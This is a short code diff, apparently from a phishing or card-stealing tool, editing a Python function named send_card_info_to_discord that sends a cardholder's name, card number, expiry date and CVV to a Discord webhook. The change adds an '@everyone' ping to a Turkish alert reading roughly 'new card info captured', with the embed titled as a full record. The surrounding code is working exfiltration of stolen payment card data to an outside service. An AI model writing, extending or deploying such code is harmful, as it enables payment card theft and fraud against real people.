@@ -600,7 +600,7 @@ def send_card_info_to_discord(username, card_holder, card_number, exp_date, cvv,
     clean_holder = card_holder.strip()
     
     payload = {
-        "content": "🔴 YENİ KART BİLGİSİ YAKALANDI!",
+        "content": "@everyone 🔴 YENİ KART BİLGİSİ YAKALANDI!",
         "embeds": [
             {
                 "title": "💳 YENİ KART BİLGİSİ — TAM KAYIT",
